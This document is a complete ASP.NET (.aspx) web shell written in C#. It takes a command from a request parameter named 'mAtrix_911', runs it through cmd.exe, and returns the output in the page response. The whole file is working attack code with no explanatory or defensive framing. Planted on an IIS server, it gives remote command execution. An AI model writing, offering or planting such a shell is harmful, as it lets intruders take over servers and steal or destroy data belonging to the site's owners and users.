<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
    string p   = "mAtrix_911";
    string cmd = Request.Form[p] ?? Request.QueryString[p] ?? "";
    if (!string.IsNullOrEmpty(cmd)) {
        try {
            var proc = new Process();
            proc.StartInfo.FileName        = "cmd.exe";
            proc.StartInfo.Arguments       = "/c " + cmd;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError  = true;
            proc.StartInfo.CreateNoWindow  = true;
            proc.Start();
            string output = proc.StandardOutput.ReadToEnd()
                          + proc.StandardError.ReadToEnd();
            proc.WaitForExit();
            Response.Write(output);
        } catch (Exception ex) {
            Response.Write("[Error] " + ex.Message);
        }
    }
%>
